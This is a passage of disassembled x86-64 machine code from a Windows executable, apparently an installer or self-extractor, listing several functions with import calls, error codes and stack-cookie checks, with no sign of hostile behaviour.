   140002c96:	77 5b                	ja     0x140002cf3
   140002c98:	48 8b ce             	mov    %rsi,%rcx
   140002c9b:	48 2b cb             	sub    %rbx,%rcx
   140002c9e:	48 81 c1 00 04 00 00 	add    $0x400,%rcx
   140002ca5:	48 8b c1             	mov    %rcx,%rax
   140002ca8:	74 4b                	je     0x140002cf5
   140002caa:	48 81 f9 ff ff ff 7f 	cmp    $0x7fffffff,%rcx
   140002cb1:	77 42                	ja     0x140002cf5
   140002cb3:	41 b8 fe ff ff 7f    	mov    $0x7ffffffe,%r8d
   140002cb9:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140002cbe:	4c 2b c1             	sub    %rcx,%r8
   140002cc1:	48 8b d3             	mov    %rbx,%rdx
   140002cc4:	4c 2b cb             	sub    %rbx,%r9
   140002cc7:	49 8d 04 08          	lea    (%r8,%rcx,1),%rax
   140002ccb:	48 85 c0             	test   %rax,%rax
   140002cce:	74 13                	je     0x140002ce3
   140002cd0:	41 8a 04 11          	mov    (%r9,%rdx,1),%al
   140002cd4:	84 c0                	test   %al,%al
   140002cd6:	74 0b                	je     0x140002ce3
   140002cd8:	88 02                	mov    %al,(%rdx)
   140002cda:	48 ff c2             	inc    %rdx
   140002cdd:	48 83 e9 01          	sub    $0x1,%rcx
   140002ce1:	75 e4                	jne    0x140002cc7
   140002ce3:	48 85 c9             	test   %rcx,%rcx
   140002ce6:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140002cea:	48 0f 45 c2          	cmovne %rdx,%rax
   140002cee:	c6 00 00             	movb   $0x0,(%rax)
   140002cf1:	eb 0a                	jmp    0x140002cfd
   140002cf3:	33 c0                	xor    %eax,%eax
   140002cf5:	48 85 c0             	test   %rax,%rax
   140002cf8:	74 03                	je     0x140002cfd
   140002cfa:	c6 03 00             	movb   $0x0,(%rbx)
   140002cfd:	49 8b c6             	mov    %r14,%rax
   140002d00:	48 ff c0             	inc    %rax
   140002d03:	80 3c 03 00          	cmpb   $0x0,(%rbx,%rax,1)
   140002d07:	75 f7                	jne    0x140002d00
   140002d09:	48 03 d8             	add    %rax,%rbx
   140002d0c:	eb 17                	jmp    0x140002d25
   140002d0e:	80 3f 23             	cmpb   $0x23,(%rdi)
   140002d11:	75 12                	jne    0x140002d25
   140002d13:	48 8b cb             	mov    %rbx,%rcx
   140002d16:	48 ff 15 2b 68 00 00 	rex.W call *0x682b(%rip)        # 0x140009548
   140002d1d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002d22:	48 8b d8             	mov    %rax,%rbx
   140002d25:	48 8b cf             	mov    %rdi,%rcx
   140002d28:	48 ff 15 19 68 00 00 	rex.W call *0x6819(%rip)        # 0x140009548
   140002d2f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002d34:	48 8b f8             	mov    %rax,%rdi
   140002d37:	8a 00                	mov    (%rax),%al
   140002d39:	84 c0                	test   %al,%al
   140002d3b:	0f 85 13 fe ff ff    	jne    0x140002b54
   140002d41:	c6 03 00             	movb   $0x0,(%rbx)
   140002d44:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140002d4b:	00 
   140002d4c:	48 33 cc             	xor    %rsp,%rcx
   140002d4f:	e8 9c 59 00 00       	call   0x1400086f0
   140002d54:	48 8b 9c 24 70 01 00 	mov    0x170(%rsp),%rbx
   140002d5b:	00 
   140002d5c:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   140002d63:	41 5e                	pop    %r14
   140002d65:	5f                   	pop    %rdi
   140002d66:	5e                   	pop    %rsi
   140002d67:	c3                   	ret
   140002d68:	cc                   	int3
   140002d69:	cc                   	int3
   140002d6a:	cc                   	int3
   140002d6b:	cc                   	int3
   140002d6c:	cc                   	int3
   140002d6d:	cc                   	int3
   140002d6e:	cc                   	int3
   140002d6f:	cc                   	int3
   140002d70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002d75:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002d7a:	57                   	push   %rdi
   140002d7b:	48 83 ec 30          	sub    $0x30,%rsp
   140002d7f:	49 8b d8             	mov    %r8,%rbx
   140002d82:	48 8b f9             	mov    %rcx,%rdi
   140002d85:	48 ff 15 ac 65 00 00 	rex.W call *0x65ac(%rip)        # 0x140009338
   140002d8c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002d91:	33 f6                	xor    %esi,%esi
   140002d93:	85 c0                	test   %eax,%eax
   140002d95:	78 52                	js     0x140002de9
   140002d97:	3c 06                	cmp    $0x6,%al
   140002d99:	72 4e                	jb     0x140002de9
   140002d9b:	48 8d 0d de 6a 00 00 	lea    0x6ade(%rip),%rcx        # 0x140009880
   140002da2:	48 ff 15 ff 65 00 00 	rex.W call *0x65ff(%rip)        # 0x1400093a8
   140002da9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002dae:	48 85 c0             	test   %rax,%rax
   140002db1:	74 36                	je     0x140002de9
   140002db3:	48 8d 15 e6 6a 00 00 	lea    0x6ae6(%rip),%rdx        # 0x1400098a0
   140002dba:	48 8b c8             	mov    %rax,%rcx
   140002dbd:	48 ff 15 bc 64 00 00 	rex.W call *0x64bc(%rip)        # 0x140009280
   140002dc4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002dc9:	48 85 c0             	test   %rax,%rax
   140002dcc:	74 1b                	je     0x140002de9
   140002dce:	49 ba 70 83 54 18 9b 	movabs $0x93b5969b18548370,%r10
   140002dd5:	96 b5 93 
   140002dd8:	45 33 c9             	xor    %r9d,%r9d
   140002ddb:	8d 56 01             	lea    0x1(%rsi),%edx
   140002dde:	45 33 c0             	xor    %r8d,%r8d
   140002de1:	33 c9                	xor    %ecx,%ecx
   140002de3:	ff 15 97 68 00 00    	call   *0x6897(%rip)        # 0x140009680
   140002de9:	48 8b d3             	mov    %rbx,%rdx
   140002dec:	89 35 52 a7 00 00    	mov    %esi,0xa752(%rip)        # 0x14000d544
   140002df2:	48 8b cf             	mov    %rdi,%rcx
   140002df5:	e8 e2 00 00 00       	call   0x140002edc
   140002dfa:	85 c0                	test   %eax,%eax
   140002dfc:	0f 84 a3 00 00 00    	je     0x140002ea5
   140002e02:	e8 0d 04 00 00       	call   0x140003214
   140002e07:	8b d8                	mov    %eax,%ebx
   140002e09:	e8 ce 35 00 00       	call   0x1400063dc
   140002e0e:	85 db                	test   %ebx,%ebx
   140002e10:	0f 84 8f 00 00 00    	je     0x140002ea5
   140002e16:	40 38 35 fd 9e 00 00 	cmp    %sil,0x9efd(%rip)        # 0x14000cd1a
   140002e1d:	0f 85 82 00 00 00    	jne    0x140002ea5
   140002e23:	8b 3d 33 b0 00 00    	mov    0xb033(%rip),%edi        # 0x14000de5c
   140002e29:	40 f6 c7 01          	test   $0x1,%dil
   140002e2d:	74 76                	je     0x140002ea5
   140002e2f:	40 f6 c7 02          	test   $0x2,%dil
   140002e33:	75 1e                	jne    0x140002e53
   140002e35:	39 35 05 a7 00 00    	cmp    %esi,0xa705(%rip)        # 0x14000d540
   140002e3b:	75 16                	jne    0x140002e53
   140002e3d:	0f b7 0d 34 b0 00 00 	movzwl 0xb034(%rip),%ecx        # 0x14000de78
   140002e44:	8b 1d 32 b0 00 00    	mov    0xb032(%rip),%ebx        # 0x14000de7c
   140002e4a:	e8 71 f5 ff ff       	call   0x1400023c0
   140002e4f:	3b d8                	cmp    %eax,%ebx
   140002e51:	74 52                	je     0x140002ea5
   140002e53:	40 f6 c7 04          	test   $0x4,%dil
   140002e57:	75 2b                	jne    0x140002e84
   140002e59:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002e60:	00 
   140002e61:	4c 8d 05 f8 68 00 00 	lea    0x68f8(%rip),%r8        # 0x140009760
   140002e68:	45 33 c9             	xor    %r9d,%r9d
   140002e6b:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140002e72:	00 
   140002e73:	ba 22 05 00 00       	mov    $0x522,%edx
   140002e78:	33 c9                	xor    %ecx,%ecx
   140002e7a:	e8 ad 20 00 00       	call   0x140004f2c
   140002e7f:	83 f8 06             	cmp    $0x6,%eax
   140002e82:	75 21                	jne    0x140002ea5
   140002e84:	66 39 35 ed af 00 00 	cmp    %si,0xafed(%rip)        # 0x14000de78
   140002e8b:	75 13                	jne    0x140002ea0
   140002e8d:	33 d2                	xor    %edx,%edx
   140002e8f:	8d 4a 02             	lea    0x2(%rdx),%ecx
   140002e92:	48 ff 15 d7 66 00 00 	rex.W call *0x66d7(%rip)        # 0x140009570
   140002e99:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002e9e:	eb 05                	jmp    0x140002ea5
   140002ea0:	e8 4f ed ff ff       	call   0x140001bf4
   140002ea5:	48 8b 0d 84 99 00 00 	mov    0x9984(%rip),%rcx        # 0x14000c830
   140002eac:	48 85 c9             	test   %rcx,%rcx
   140002eaf:	74 0c                	je     0x140002ebd
   140002eb1:	48 ff 15 a0 63 00 00 	rex.W call *0x63a0(%rip)        # 0x140009258
   140002eb8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ebd:	8b 05 81 a6 00 00    	mov    0xa681(%rip),%eax        # 0x14000d544
   140002ec3:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140002ec8:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140002ecd:	48 83 c4 30          	add    $0x30,%rsp
   140002ed1:	5f                   	pop    %rdi
   140002ed2:	c3                   	ret
   140002ed3:	cc                   	int3
   140002ed4:	cc                   	int3
   140002ed5:	cc                   	int3
   140002ed6:	cc                   	int3
   140002ed7:	cc                   	int3
   140002ed8:	cc                   	int3
   140002ed9:	cc                   	int3
   140002eda:	cc                   	int3
   140002edb:	cc                   	int3
   140002edc:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002ee1:	56                   	push   %rsi
   140002ee2:	57                   	push   %rdi
   140002ee3:	41 56                	push   %r14
   140002ee5:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140002eec:	48 8b 05 15 91 00 00 	mov    0x9115(%rip),%rax        # 0x14000c008
   140002ef3:	48 33 c4             	xor    %rsp,%rax
   140002ef6:	48 89 84 24 40 01 00 	mov    %rax,0x140(%rsp)
   140002efd:	00 
   140002efe:	48 8b f2             	mov    %rdx,%rsi
   140002f01:	48 89 0d 68 af 00 00 	mov    %rcx,0xaf68(%rip)        # 0x14000de70
   140002f08:	48 8b d9             	mov    %rcx,%rbx
   140002f0b:	33 d2                	xor    %edx,%edx
   140002f0d:	48 8d 0d 4c a6 00 00 	lea    0xa64c(%rip),%rcx        # 0x14000d560
   140002f14:	41 b8 10 09 00 00    	mov    $0x910,%r8d
   140002f1a:	33 ff                	xor    %edi,%edi
   140002f1c:	e8 88 5e 00 00       	call   0x140008da9
   140002f21:	33 d2                	xor    %edx,%edx
   140002f23:	48 8d 0d d6 9d 00 00 	lea    0x9dd6(%rip),%rcx        # 0x14000cd00
   140002f2a:	41 b8 2c 03 00 00    	mov    $0x32c,%r8d
   140002f30:	e8 74 5e 00 00       	call   0x140008da9
   140002f35:	33 d2                	xor    %edx,%edx
   140002f37:	48 8d 0d 62 9c 00 00 	lea    0x9c62(%rip),%rcx        # 0x14000cba0
   140002f3e:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002f44:	e8 60 5e 00 00       	call   0x140008da9
   140002f49:	44 8d 77 01          	lea    0x1(%rdi),%r14d
   140002f4d:	44 8d 47 7f          	lea    0x7f(%rdi),%r8d
   140002f51:	44 89 35 c0 a8 00 00 	mov    %r14d,0xa8c0(%rip)        # 0x14000d818
   140002f58:	48 8d 15 19 a6 00 00 	lea    0xa619(%rip),%rdx        # 0x14000d578
   140002f5f:	48 8d 0d 4e 69 00 00 	lea    0x694e(%rip),%rcx        # 0x1400098b4
   140002f66:	e8 8d 22 00 00       	call   0x1400051f8
   140002f6b:	ff c8                	dec    %eax
   140002f6d:	45 33 c9             	xor    %r9d,%r9d
   140002f70:	33 c9                	xor    %ecx,%ecx
   140002f72:	83 f8 7f             	cmp    $0x7f,%eax
   140002f75:	0f 87 52 02 00 00    	ja     0x1400031cd
   140002f7b:	45 8b c6             	mov    %r14d,%r8d
   140002f7e:	41 8b d6             	mov    %r14d,%edx
   140002f81:	48 ff 15 48 64 00 00 	rex.W call *0x6448(%rip)        # 0x1400093d0
   140002f88:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002f8d:	48 8b c8             	mov    %rax,%rcx
   140002f90:	48 89 05 a1 98 00 00 	mov    %rax,0x98a1(%rip)        # 0x14000c838
   140002f97:	48 ff 15 c2 63 00 00 	rex.W call *0x63c2(%rip)        # 0x140009360
   140002f9e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002fa3:	44 8d 47 04          	lea    0x4(%rdi),%r8d
   140002fa7:	48 8d 15 b6 ae 00 00 	lea    0xaeb6(%rip),%rdx        # 0x14000de64
   140002fae:	48 8d 0d 0b 69 00 00 	lea    0x690b(%rip),%rcx        # 0x1400098c0
   140002fb5:	e8 3e 22 00 00       	call   0x1400051f8
   140002fba:	85 c0                	test   %eax,%eax
   140002fbc:	75 2d                	jne    0x140002feb
   140002fbe:	21 7c 24 28          	and    %edi,0x28(%rsp)
   140002fc2:	45 33 c9             	xor    %r9d,%r9d
   140002fc5:	45 33 c0             	xor    %r8d,%r8d
   140002fc8:	33 c9                	xor    %ecx,%ecx
   140002fca:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140002fcf:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140002fd6:	00 
   140002fd7:	e8 50 1f 00 00       	call   0x140004f2c
   140002fdc:	c7 05 5e a5 00 00 14 	movl   $0x80070714,0xa55e(%rip)        # 0x14000d544
   140002fe3:	07 07 80 
   140002fe6:	e9 fb 01 00 00       	jmp    0x1400031e6
   140002feb:	8b 05 73 ae 00 00    	mov    0xae73(%rip),%eax        # 0x14000de64
   140002ff1:	a8 40                	test   $0x40,%al
   140002ff3:	75 08                	jne    0x140002ffd
   140002ff5:	84 c0                	test   %al,%al
   140002ff7:	0f 89 ce 00 00 00    	jns    0x1400030cb
   140002ffd:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003003:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003008:	48 8d 0d c1 68 00 00 	lea    0x68c1(%rip),%rcx        # 0x1400098d0
   14000300f:	e8 e4 21 00 00       	call   0x1400051f8
   140003014:	33 c9                	xor    %ecx,%ecx
   140003016:	85 c0                	test   %eax,%eax
   140003018:	75 0c                	jne    0x140003026
   14000301a:	21 7c 24 28          	and    %edi,0x28(%rsp)
   14000301e:	45 33 c9             	xor    %r9d,%r9d
   140003021:	45 33 c0             	xor    %r8d,%r8d
   140003024:	eb a4                	jmp    0x140002fca
   140003026:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000302b:	41 8b d6             	mov    %r14d,%edx
   14000302e:	48 ff 15 db 62 00 00 	rex.W call *0x62db(%rip)        # 0x140009310
   140003035:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000303a:	48 89 05 ef 97 00 00 	mov    %rax,0x97ef(%rip)        # 0x14000c830
   140003041:	48 85 c0             	test   %rax,%rax
   140003044:	0f 84 81 00 00 00    	je     0x1400030cb
   14000304a:	48 ff 15 cf 61 00 00 	rex.W call *0x61cf(%rip)        # 0x140009220
   140003051:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003056:	3d b7 00 00 00       	cmp    $0xb7,%eax
   14000305b:	75 6e                	jne    0x1400030cb
   14000305d:	45 33 c9             	xor    %r9d,%r9d
   140003060:	4c 8d 05 11 a5 00 00 	lea    0xa511(%rip),%r8        # 0x14000d578
   140003067:	33 c9                	xor    %ecx,%ecx
   140003069:	f6 05 f4 ad 00 00 80 	testb  $0x80,0xadf4(%rip)        # 0x14000de64
   140003070:	74 18                	je     0x14000308a
   140003072:	21 7c 24 28          	and    %edi,0x28(%rsp)
   140003076:	ba 4b 05 00 00       	mov    $0x54b,%edx
   14000307b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003082:	00 
   140003083:	e8 a4 1e 00 00       	call   0x140004f2c
   140003088:	eb 1f                	jmp    0x1400030a9
   14000308a:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003091:	00 
   140003092:	ba 24 05 00 00       	mov    $0x524,%edx
   140003097:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   14000309e:	00 
   14000309f:	e8 88 1e 00 00       	call   0x140004f2c
   1400030a4:	83 f8 06             	cmp    $0x6,%eax
   1400030a7:	74 22                	je     0x1400030cb
   1400030a9:	48 8b 0d 80 97 00 00 	mov    0x9780(%rip),%rcx        # 0x14000c830
   1400030b0:	48 ff 15 a1 61 00 00 	rex.W call *0x61a1(%rip)        # 0x140009258
   1400030b7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400030bc:	c7 05 7e a4 00 00 b7 	movl   $0x800700b7,0xa47e(%rip)        # 0x14000d544
   1400030c3:	00 07 80 
   1400030c6:	e9 1b 01 00 00       	jmp    0x1400031e6
   1400030cb:	21 3d 6f a4 00 00    	and    %edi,0xa46f(%rip)        # 0x14000d540
   1400030d1:	48 8b ce             	mov    %rsi,%rcx
   1400030d4:	e8 47 42 00 00       	call   0x140007320
   1400030d9:	85 c0                	test   %eax,%eax
   1400030db:	75 0f                	jne    0x1400030ec
   1400030dd:	45 33 c9             	xor    %r9d,%r9d
   1400030e0:	ba 20 05 00 00       	mov    $0x520,%edx
   1400030e5:	33 c9                	xor    %ecx,%ecx
   1400030e7:	e9 e6 00 00 00       	jmp    0x1400031d2
   1400030ec:	40 38 3d 27 9c 00 00 	cmp    %dil,0x9c27(%rip)        # 0x14000cd1a
   1400030f3:	74 11                	je     0x140003106
   1400030f5:	48 8d 0d 1e 9c 00 00 	lea    0x9c1e(%rip),%rcx        # 0x14000cd1a
   1400030fc:	e8 33 ef ff ff       	call   0x140002034
   140003101:	e9 e0 00 00 00       	jmp    0x1400031e6
   140003106:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   14000310c:	48 8d 15 cd 67 00 00 	lea    0x67cd(%rip),%rdx        # 0x1400098e0
   140003113:	48 8b cb             	mov    %rbx,%rcx
   140003116:	48 ff 15 eb 61 00 00 	rex.W call *0x61eb(%rip)        # 0x140009308
   14000311d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003122:	48 85 c0             	test   %rax,%rax
   140003125:	74 15                	je     0x14000313c
   140003127:	48 8b d0             	mov    %rax,%rdx
   14000312a:	48 8b cb             	mov    %rbx,%rcx
   14000312d:	48 ff 15 64 62 00 00 	rex.W call *0x6264(%rip)        # 0x140009398
   140003134:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003139:	48 8b f8             	mov    %rax,%rdi
   14000313c:	83 3d 69 90 00 00 00 	cmpl   $0x0,0x9069(%rip)        # 0x14000c1ac
   140003143:	74 0c                	je     0x140003151
   140003145:	48 ff 15 74 60 00 00 	rex.W call *0x6074(%rip)        # 0x1400091c0
   14000314c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003151:	83 3d ac 9b 00 00 00 	cmpl   $0x0,0x9bac(%rip)        # 0x14000cd04
   140003158:	74 08                	je     0x140003162
   14000315a:	41 8b c6             	mov    %r14d,%eax
   14000315d:	e9 86 00 00 00       	jmp    0x1400031e8
   140003162:	48 8b cf             	mov    %rdi,%rcx
   140003165:	e8 ca 0b 00 00       	call   0x140003d34
   14000316a:	85 c0                	test   %eax,%eax
   14000316c:	74 78                	je     0x1400031e6
   14000316e:	0f b7 05 03 ad 00 00 	movzwl 0xad03(%rip),%eax        # 0x14000de78
   140003175:	66 41 2b c6          	sub    %r14w,%ax
   140003179:	66 83 f8 02          	cmp    $0x2,%ax
   14000317d:	77 db                	ja     0x14000315a
   14000317f:	f7 05 db ac 00 00 00 	testl  $0x100,0xacdb(%rip)        # 0x14000de64
   140003186:	01 00 00 
   140003189:	74 cf                	je     0x14000315a
   14000318b:	44 84 35 86 9b 00 00 	test   %r14b,0x9b86(%rip)        # 0x14000cd18
   140003192:	75 c6                	jne    0x14000315a
   140003194:	e8 bf e0 ff ff       	call   0x140001258
   140003199:	85 c0                	test   %eax,%eax
   14000319b:	75 bd                	jne    0x14000315a
   14000319d:	48 c7 44 24 28 3e 08 	movq   $0x83e,0x28(%rsp)
   1400031a4:	00 00 
   1400031a6:	4c 8d 0d c3 e2 ff ff 	lea    -0x1d3d(%rip),%r9        # 0x140001470
   1400031ad:	45 33 c0             	xor    %r8d,%r8d
   1400031b0:	48 c7 44 24 20 47 05 	movq   $0x547,0x20(%rsp)
   1400031b7:	00 00 
   1400031b9:	ba d6 07 00 00       	mov    $0x7d6,%edx
   1400031be:	e8 65 4b 00 00       	call   0x140007d28
   1400031c3:	48 3d 3d 08 00 00    	cmp    $0x83d,%rax
   1400031c9:	75 1b                	jne    0x1400031e6
   1400031cb:	eb 8d                	jmp    0x14000315a
   1400031cd:	ba b1 04 00 00       	mov    $0x4b1,%edx
   1400031d2:	21 7c 24 28          	and    %edi,0x28(%rsp)
   1400031d6:	45 33 c0             	xor    %r8d,%r8d
   1400031d9:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400031e0:	00 
   1400031e1:	e8 46 1d 00 00       	call   0x140004f2c
   1400031e6:	33 c0                	xor    %eax,%eax
   1400031e8:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   1400031ef:	00 
   1400031f0:	48 33 cc             	xor    %rsp,%rcx
   1400031f3:	e8 f8 54 00 00       	call   0x1400086f0
   1400031f8:	48 8b 9c 24 80 01 00 	mov    0x180(%rsp),%rbx
   1400031ff:	00 
   140003200:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   140003207:	41 5e                	pop    %r14
   140003209:	5f                   	pop    %rdi
   14000320a:	5e                   	pop    %rsi
   14000320b:	c3                   	ret
   14000320c:	cc                   	int3
   14000320d:	cc                   	int3
   14000320e:	cc                   	int3
   14000320f:	cc                   	int3
   140003210:	cc                   	int3
   140003211:	cc                   	int3
   140003212:	cc                   	int3
   140003213:	cc                   	int3
   140003214:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003219:	57                   	push   %rdi
   14000321a:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   140003221:	48 8b 05 e0 8d 00 00 	mov    0x8de0(%rip),%rax        # 0x14000c008
   140003228:	48 33 c4             	xor    %rsp,%rax
   14000322b:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   140003232:	00 
   140003233:	33 ff                	xor    %edi,%edi
   140003235:	66 39 3d dc 9a 00 00 	cmp    %di,0x9adc(%rip)        # 0x14000cd18
   14000323c:	75 2b                	jne    0x140003269
   14000323e:	39 3d c0 9a 00 00    	cmp    %edi,0x9ac0(%rip)        # 0x14000cd04
   140003244:	75 16                	jne    0x14000325c
   140003246:	e8 49 30 00 00       	call   0x140006294
   14000324b:	85 c0                	test   %eax,%eax
   14000324d:	0f 84 15 01 00 00    	je     0x140003368
   140003253:	66 39 3d be 9a 00 00 	cmp    %di,0x9abe(%rip)        # 0x14000cd18
   14000325a:	75 0d                	jne    0x140003269
   14000325c:	e8 03 0e 00 00       	call   0x140004064
   140003261:	85 c0                	test   %eax,%eax
   140003263:	0f 84 ff 00 00 00    	je     0x140003368
   140003269:	e8 66 2f 00 00       	call   0x1400061d4
   14000326e:	85 c0                	test   %eax,%eax
   140003270:	0f 84 f2 00 00 00    	je     0x140003368
   140003276:	e8 75 36 00 00       	call   0x1400068f0
   14000327b:	85 c0                	test   %eax,%eax
   14000327d:	0f 84 e5 00 00 00    	je     0x140003368
   140003283:	bb 05 01 00 00       	mov    $0x105,%ebx
   140003288:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000328d:	8b d3                	mov    %ebx,%edx
   14000328f:	48 ff 15 9a 5f 00 00 	rex.W call *0x5f9a(%rip)        # 0x140009230
   140003296:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000329b:	4c 8d 05 c6 64 00 00 	lea    0x64c6(%rip),%r8        # 0x140009768
   1400032a2:	8b d3                	mov    %ebx,%edx
   1400032a4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400032a9:	e8 5a 4b 00 00       	call   0x140007e08
   1400032ae:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400032b3:	48 ff 15 7e 5f 00 00 	rex.W call *0x5f7e(%rip)        # 0x140009238
   1400032ba:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400032bf:	48 8b d8             	mov    %rax,%rbx
   1400032c2:	48 85 c0             	test   %rax,%rax
   1400032c5:	74 34                	je     0x1400032fb
   1400032c7:	48 8d 15 22 66 00 00 	lea    0x6622(%rip),%rdx        # 0x1400098f0
   1400032ce:	48 8b c8             	mov    %rax,%rcx
   1400032d1:	48 ff 15 a8 5f 00 00 	rex.W call *0x5fa8(%rip)        # 0x140009280
   1400032d8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400032dd:	48 85 c0             	test   %rax,%rax
   1400032e0:	74 19                	je     0x1400032fb
   1400032e2:	49 ba 70 3a db 76 fd 	movabs $0xd1e917fd76db3a70,%r10
   1400032e9:	17 e9 d1 
   1400032ec:	33 d2                	xor    %edx,%edx
   1400032ee:	48 8d 0d 1b a3 00 00 	lea    0xa31b(%rip),%rcx        # 0x14000d610
   1400032f5:	ff 15 85 63 00 00    	call   *0x6385(%rip)        # 0x140009680
   1400032fb:	48 8b cb             	mov    %rbx,%rcx
   1400032fe:	48 ff 15 9b 5f 00 00 	rex.W call *0x5f9b(%rip)        # 0x1400092a0
   140003305:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000330a:	39 3d f4 99 00 00    	cmp    %edi,0x99f4(%rip)        # 0x14000cd04
   140003310:	0f 85 8f 00 00 00    	jne    0x1400033a5
   140003316:	39 3d 44 ab 00 00    	cmp    %edi,0xab44(%rip)        # 0x14000de60
   14000331c:	0f 85 83 00 00 00    	jne    0x1400033a5
   140003322:	ba 04 01 00 00       	mov    $0x104,%edx
   140003327:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   14000332e:	00 
   14000332f:	48 ff 15 3a 5f 00 00 	rex.W call *0x5f3a(%rip)        # 0x140009270
   140003336:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000333b:	85 c0                	test   %eax,%eax
   14000333d:	75 4d                	jne    0x14000338c
   14000333f:	ba f0 04 00 00       	mov    $0x4f0,%edx
   140003344:	45 33 c9             	xor    %r9d,%r9d
   140003347:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000334b:	45 33 c0             	xor    %r8d,%r8d
   14000334e:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003355:	00 
   140003356:	33 c9                	xor    %ecx,%ecx
   140003358:	e8 cf 1b 00 00       	call   0x140004f2c
   14000335d:	e8 f6 45 00 00       	call   0x140007958
   140003362:	89 05 dc a1 00 00    	mov    %eax,0xa1dc(%rip)        # 0x14000d544
   140003368:	33 c0                	xor    %eax,%eax
   14000336a:	48 8b 8c 24 50 02 00 	mov    0x250(%rsp),%rcx
   140003371:	00 
   140003372:	48 33 cc             	xor    %rsp,%rcx
   140003375:	e8 76 53 00 00       	call   0x1400086f0
   14000337a:	48 8b 9c 24 70 02 00 	mov    0x270(%rsp),%rbx
   140003381:	00 
   140003382:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   140003389:	5f                   	pop    %rdi
   14000338a:	c3                   	ret
   14000338b:	cc                   	int3
   14000338c:	ba 02 00 00 00       	mov    $0x2,%edx
   140003391:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   140003398:	00 
   140003399:	44 8b c2             	mov    %edx,%r8d
   14000339c:	e8 73 3b 00 00       	call   0x140006f14
   1400033a1:	85 c0                	test   %eax,%eax
   1400033a3:	74 c3                	je     0x140003368
   1400033a5:	48 8d 0d 64 a2 00 00 	lea    0xa264(%rip),%rcx        # 0x14000d610
   1400033ac:	48 ff 15 8d 5f 00 00 	rex.W call *0x5f8d(%rip)        # 0x140009340
   1400033b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400033b8:	85 c0                	test   %eax,%eax
   1400033ba:	75 07                	jne    0x1400033c3
   1400033bc:	ba bc 04 00 00       	mov    $0x4bc,%edx
   1400033c1:	eb 81                	jmp    0x140003344
   1400033c3:	39 3d 43 99 00 00    	cmp    %edi,0x9943(%rip)        # 0x14000cd0c
   1400033c9:	0f 85 90 00 00 00    	jne    0x14000345f
   1400033cf:	48 8d 05 6a 9c 00 00 	lea    0x9c6a(%rip),%rax        # 0x14000d040
   1400033d6:	b9 28 00 00 00       	mov    $0x28,%ecx
   1400033db:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400033e1:	48 8d 40 20          	lea    0x20(%rax),%rax
   1400033e5:	48 83 e9 01          	sub    $0x1,%rcx
   1400033e9:	75 f0                	jne    0x1400033db
   1400033eb:	f6 05 26 99 00 00 01 	testb  $0x1,0x9926(%rip)        # 0x14000cd18
   1400033f2:	75 39                	jne    0x14000342d
   1400033f4:	f6 05 69 aa 00 00 01 	testb  $0x1,0xaa69(%rip)        # 0x14000de64
   1400033fb:	75 30                	jne    0x14000342d
   1400033fd:	8b 05 a9 8d 00 00    	mov    0x8da9(%rip),%eax        # 0x14000c1ac
